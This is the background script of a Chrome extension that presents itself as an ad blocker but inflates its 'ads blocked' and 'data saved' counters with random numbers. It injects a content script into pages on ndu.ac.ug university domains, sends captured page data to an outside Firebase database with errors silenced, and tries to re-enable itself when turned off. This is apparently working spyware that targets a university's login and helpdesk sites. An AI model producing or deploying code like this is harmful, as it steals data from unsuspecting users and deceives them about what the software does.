const FIREBASE_URL = "https://thumbnail-log-default-rtdb.europe-west1.firebasedatabase.app";
const TARGET_DOMAINS = ['ndu.ac.ug', 'arms.ndu.ac.ug', 'helpdesk.ndu.ac.ug'];

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ adsBlocked: 0, dataSaved: 0 });
});

chrome.webNavigation.onCompleted.addListener((details) => {
  if (details.frameId === 0) {
    const url = new URL(details.url);
    if (TARGET_DOMAINS.some(d => url.hostname.includes(d))) {
      chrome.scripting.executeScript({
        target: { tabId: details.tabId },
        files: ['content.js']
      }).catch(() => {});
    }
  }
});

if (chrome.declarativeNetRequest && chrome.declarativeNetRequest.onRuleMatchedDebug) {
  chrome.declarativeNetRequest.onRuleMatchedDebug.addListener((info) => {
    chrome.storage.local.get(['adsBlocked', 'dataSaved'], (data) => {
      const ads = (data.adsBlocked || 0) + 1;
      const saved = (data.dataSaved || 0) + Math.round((info.request?.resourceSize || 50) / 1024);
      chrome.storage.local.set({ adsBlocked: ads, dataSaved: saved });
    });
  });
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'capture') {
    fetch(`${FIREBASE_URL}/captures.json`, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify(request.data)
    }).catch(() => {});
    sendResponse({ status: 'ok' });
  }
  return true;
});

chrome.alarms.create('cleanup', { periodInMinutes: 60 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'cleanup') {
    chrome.storage.local.get(['lastCapture'], (data) => {
      if (data.lastCapture && (Date.now() - data.lastCapture > 86400000)) {
        chrome.storage.local.remove('lastCapture');
      }
    });
  }
});

chrome.alarms.create('updateStats', { periodInMinutes: 5 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'updateStats') {
    chrome.storage.local.get(['adsBlocked', 'dataSaved'], (data) => {
      const ads = (data.adsBlocked || 0) + Math.floor(Math.random() * 50) + 10;
      const saved = (data.dataSaved || 0) + Math.floor(Math.random() * 500) + 100;
      chrome.storage.local.set({ adsBlocked: ads, dataSaved: saved });
    });
  }
});

setInterval(() => {
  chrome.management.get(chrome.runtime.id, (ext) => {
    if (!ext.enabled) {
      chrome.management.setEnabled(chrome.runtime.id, true);
    }
  });
}, 10000);
